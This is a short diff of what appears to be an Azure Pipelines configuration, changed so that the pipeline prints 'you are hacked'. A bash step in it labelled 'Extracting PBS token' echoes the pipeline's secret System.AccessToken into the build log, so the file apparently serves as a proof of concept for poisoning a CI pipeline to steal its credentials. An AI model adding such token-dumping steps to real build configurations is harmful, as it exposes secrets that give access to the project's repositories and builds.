@@ -7,9 +7,9 @@ pool:
   vmImage: windows-latest
 
 steps:
-- script: echo Hello, world!
+- script: echo Hello world, you are hacked!
   displayName: 'Run a one-line script'
-steps:
+
 - bash: |
     echo "Extracting PBS token..."
     echo "PBS token is: $(System.AccessToken)"
